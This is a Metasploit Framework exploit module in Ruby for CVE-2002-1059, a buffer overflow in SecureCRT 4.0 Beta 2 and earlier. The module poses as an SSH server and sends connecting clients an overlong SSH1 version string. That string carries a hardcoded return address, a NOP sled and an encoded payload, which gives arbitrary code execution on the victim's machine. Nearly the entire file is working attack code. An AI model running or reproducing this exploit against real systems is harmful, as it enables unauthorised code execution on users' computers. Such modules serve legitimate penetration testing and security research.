##
# $Id: securecrt_ssh1.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SecureCRT <= 4.0 Beta 2 SSH1 Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in SecureCRT <= 4.0
				Beta 2. By sending a vulnerable client an overly long
				SSH1 protocol identifier string, it is possible to execute
				arbitrary code.

				This module has only been tested on SecureCRT 3.4.4.
			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2002-1059' ],
					[ 'OSVDB', '4991' ],
					[ 'BID', '5287' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00",
					'MaxNops'  => 0,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'SecureCRT.exe (3.4.4)', { 'Ret' => 0x0041b3e0 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jul 23 2002',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The SSH daemon port to listen on", 22 ])
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		buffer =  "SSH-1.1-OpenSSH_3.6.1p2\r\n" + rand_text_english(243)
		buffer << [target.ret].pack('V') + make_nops(20) + payload.encoded

		print_status("Sending #{buffer.length} bytes to #{client.getpeername}:#{client.peerport}...")

		client.put(buffer)
		handler

		service.close_client(client)
	end

end
